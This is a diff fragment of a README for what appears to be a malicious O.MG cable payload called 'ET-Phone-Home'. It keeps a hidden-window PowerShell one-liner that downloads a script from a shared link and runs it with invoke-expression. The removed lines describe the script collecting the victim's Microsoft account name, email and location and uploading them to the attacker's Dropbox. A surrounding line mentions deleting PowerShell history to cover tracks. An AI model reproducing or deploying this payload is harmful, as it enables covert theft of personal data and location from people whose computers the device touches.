@@ -41,13 +41,6 @@ Finally the end of the script will delete the runbox and powershell history and 
 ```
 powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
 ```
-* The OMG device will attempt to detect the Wifi Access point you designated, if it does not.. 
-* A one liner in the run box will download and execute the ET-Phone-Home Script 
-* This script will get the Name and Email associated with the microsoft account of the persons computer your device connected to 
-* The latitude and longitude of where the device was when it was activated will also be collected 
-* This gathered information will be saved to a text file in the TMP Directory 
-* That file will be uploaded to your DropBox cloud storage 
-
 Something Like What you see below will be in your cloud storage:
 
 NAME
